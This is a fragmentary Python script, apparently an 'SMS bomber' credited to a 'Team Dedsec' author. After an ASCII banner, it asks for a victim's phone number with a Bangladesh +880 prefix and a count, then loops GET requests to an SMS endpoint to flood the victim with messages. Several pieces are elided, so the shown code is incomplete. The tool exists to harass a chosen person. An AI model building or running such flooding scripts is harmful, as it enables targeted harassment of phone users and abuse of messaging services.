...
.d8888.  .d8b.  d888888b .88b  d88. db    db d8b   db 
88'  YP d8' `8b   `88'   88'YbdP`88 88    88 888o  88 
`8bo.   88ooo88    88    88  88  88 88    88 88V8o 88 
  `Y8b. 88~~~88    88    88  88  88 88    88 88 V8o88 
db   8D 88   88   .88.   88  88  88 88b  d88 88  V888 
`8888Y' YP   YP Y888888P YP  YP  YP ~Y8888P' VP   V8P 
...
\033[1;32m[-] AUTHOR    :\033[1;32m SAIMUN SALAM HRIDOY
\033[1;32m[-] GITHUB    :\033[1;32m SAIMUN-HRIDOY
\033[1;32m[-] FACEBOOK  :\033[1;32m SAIMUN SALAM HRIDOY
...
number=input(f"{c}\n[ VICTIM NUMBER ] :{w} +880")
amo=int(input(c+"\n[ AMOUNT ] : "+w))
xak(f"\n\n\t {w}<{r}/{w}> {g}STAY WITH TEAM DEDSEC ;) {w}<{r}/{w}>\n\n")
...
os.system("xdg-open https://github.com/SAIMUN-HRIDOY")
print (logo)
print(f"""\n{ran}\033[1;31m                                                               
\t\033[1;32m                 
\t\033[1;32m                
...
for i in range(amo):
	resp1 = requests.get(url1)
	print(f"\n\t\t {ran2}SMS SENT SUCCESFULLY💚  BY SAIMUN-DEDSEC "+w+tim)
